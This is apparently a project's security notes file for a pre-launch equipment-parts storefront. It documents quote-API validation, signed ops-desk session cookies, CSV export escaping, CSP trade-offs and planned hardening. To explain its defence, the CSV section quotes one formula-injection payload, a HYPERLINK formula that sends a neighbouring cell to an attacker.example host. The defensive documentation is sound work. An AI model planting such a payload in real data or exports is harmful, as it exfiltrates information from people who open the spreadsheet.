# SECURITY NOTES — JM Equipment Parts Store

**Date:** 2026-07-08 · **Status:** code-complete on main; launch is configuration (see LAUNCH.md).

## Current posture
- **Pre-launch.** This is a launch-candidate MVP. It is not deployed and is not launch-approved.
- **No integrations in the repo.** No payment processor, WooCommerce, or QuickBooks connection. Two *optional, env-gated* outbound integrations exist in code and are inert without configuration: SMTP delivery of RFQ notifications (`SMTP_*` + `RFQ_NOTIFY_TO`) and the Anthropic API for agent upgrades (`ANTHROPIC_API_KEY`). Neither has credentials in the repo; both no-op gracefully when unconfigured.
- **No secrets.** No API keys, tokens, or credentials exist in the repo. All secrets (`OPS_TOKEN`, `ANTHROPIC_API_KEY`) are supplied via environment variables only and never committed.
- **No deployment.** Nothing is deployed to any host.
- **Indexing gated by launch mode.** Default (and every preview): global noindex + `robots.ts Disallow: /`. Setting `JME_LAUNCH=live` at build time — only in the approved production environment — flips robots/meta to indexable and publishes the sitemap (see LAUNCH.md). `/ops` and `/api/` are excluded from crawling even when live.
- **Data boundaries.** No price, cost, margin, exact quantity, vendor, bin, supplier, or QuickBooks data exists in the client tier. See `DATA_BOUNDARIES.md`.
- **Security headers.** CSP, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy` set globally in `next.config.mjs` (CSP still allows `unsafe-inline` for Next bootstrap — tighten with nonces pre-launch).

## Quote API (`/api/quote`)
Validates input, persists the RFQ, returns a crypto-random reference, and — when SMTP is configured via environment — emails the desk. It never charges anything and never blocks the customer on delivery.
- Server-side validation; required company / name / email; SKU allowlist; qty clamped.
- **Honeypot** field — bot submissions get a fake success and are discarded.
- **In-memory per-IP rate limiting** (single-instance; move to edge/Redis for production scale).
- **No PII logging** — audit events carry event kind, timestamp, counts, and a hashed client key only.
- **Generic** success/failure responses (no field-level detail leakage).
- **Persistence:** RFQs (contact PII + line items) are written to `.data/rfqs.json` — gitignored, server-side only, readable exclusively through the ops-authenticated API. Retention/deletion policy required before launch.
- **Email delivery:** env-gated via `SMTP_*` + `RFQ_NOTIFY_TO` (src/lib/mail.ts); fire-and-forget, failures audited as `mail_error` with zero PII, RFQ always persisted regardless.

## Ops desk (`/ops` + `/api/ops/*`)
- **Auth:** single shared token (`OPS_TOKEN` env). Login sets an httpOnly, secure, sameSite=strict cookie holding `<expiry>.<nonce>.<HMAC>` signed with the token; comparisons are constant-time; login is rate-limited per client (5 attempts, then 429) and failures are audited. The expiry is **inside the signed payload**, so it is enforced server-side rather than trusted from the browser, and the nonce makes each login a distinct credential. Rotating `OPS_TOKEN` invalidates every existing session. (Previously the cookie was a bare SHA-256 of the token: identical for every login and valid until the token was rotated, with `Max-Age` only a browser-side hint — a captured cookie never expired.)
- **Modes:** token set → login required. Token unset → **disabled in production**, open in local dev with a visible banner (zero-secret demo).
- **Pre-launch requirement:** replace the shared token with per-user auth (SSO) before multi-person use; the gate is isolated in `src/lib/opsAuth.ts` for that swap.
- **CSV export:** the RFQ book is customer-typed text that gets opened in Excel, so RFC 4180 escaping is not enough on its own — Excel and Sheets evaluate a leading `=`, `+`, `-`, `@`, tab or CR *even inside a quoted field*. Fields that would start a formula are prefixed with an apostrophe in `src/lib/csv.ts`, so a company name of `=HYPERLINK("http://attacker.example/?d="&A1,"…")` cannot render as a working link that exfiltrates the neighbouring cell. `tests/csvSafety.test.ts` asserts on the fields **as a spreadsheet parses them**, not on the raw line — the raw line looks correctly escaped either way, which is why this was invisible.

## Accessibility audit (`scripts/a11y-audit.mjs`)
- The staff sweep signs its own session cookie, mirroring `issueSession()` in `src/lib/opsAuth.ts`. **Keep the two in step.** A cookie the app rejects does not fail the audit — every staff route renders the login form instead, and a login form has no violations, so the run goes green over pages nobody loaded. Each staff route therefore asserts it is not looking at the login form and errors by name if it is; that assertion is the safeguard, not the cookie code.

## Built-in agents & AI provider
- Support/triage/maintenance/security agents run **deterministic rules engines by default** — no key, no outbound calls, fully functional.
- With `ANTHROPIC_API_KEY` set, agents upgrade to LLM output. **PII never enters a prompt**: the support agent is grounded on the public catalog/FAQ only (with a code-level refusal guardrail for pricing/quantity/vendor questions and an output screen for `$` amounts); triage/security agents receive PII-free projections (refs, counts, ages, hashed keys).
- The audit log (`.data/audit.jsonl`) is PII-free by construction, so it is safe to feed to monitoring or an LLM. It rotates at 8 MB, keeping one previous generation (`audit.jsonl.1`), so disk stays bounded at roughly 16 MB — an append-only log that grows for the life of the site eventually fills the volume, and a full volume is what stops RFQs being written. Reads take only the tail of the file, so the cost of showing recent events does not grow with the length of the history.

## Decision record: CSP `unsafe-inline`
The CSP keeps `'unsafe-inline'` for script/style. Removing it requires per-request
nonces, which forces dynamic rendering and gives up the fully static build of a
42-page catalog site. Accepted because the XSS surface is minimal by
construction: no user-generated content is ever rendered as HTML anywhere —
user input appears only as React text nodes (auto-escaped), and API responses
are JSON. Revisit (nonce middleware) only if user-generated HTML is ever
introduced. All other headers remain strict.

## Future production security requirements (post-launch hardening)
- Dependency audit runs in CI on every push/PR, split by blast radius:
  **production deps are a hard gate** (`npm audit --audit-level=moderate
  --omit=dev`, currently zero vulnerabilities), while **build-time tooling is
  reported without failing the build**. The split exists because a dev-only
  advisory can be unfixable for months: today `brace-expansion`
  GHSA-mh99-v99m-4gvg (DoS in a glob matcher used at lint time) is patched only
  in 5.0.8, reachable solely by upgrading to eslint 10 — which
  `eslint-config-next` cannot load (its bundled `eslint-plugin-react` crashes on
  the v10 rule API). Nothing in that chain is bundled or served. **Re-check when
  `eslint-config-next` supports eslint 10** and restore the single hard gate.
- Runtime kept on a supported Node release. Node 20 reached end-of-life in
  April 2026, so the Docker image, both CI workflows, and `engines` now pin
  Node 22 LTS (supported into 2027). An EOL runtime stops receiving security
  patches entirely, which no amount of dependency auditing compensates for —
  re-check this when Node 22 approaches its own EOL.
- Secrets manager for integration credentials; never in the repo.
- Per-user authentication for the ops desk (replace shared token); keep it off public navigation.
- Edge/server rate limiting and abuse protection (replace in-memory limiter).
- Retention tooling exists (`npm run retention`, archives+purges old closed RFQs); JM to pick the window and schedule it. Encrypted-at-rest volume or managed DB when scaling.
- Penetration test and security review before public launch.
- Legacy Electron CRM (repo root) uses `nodeIntegration:true` / `contextIsolation:false` — pre-existing and out of scope here; flag for separate review if that app is carried forward.
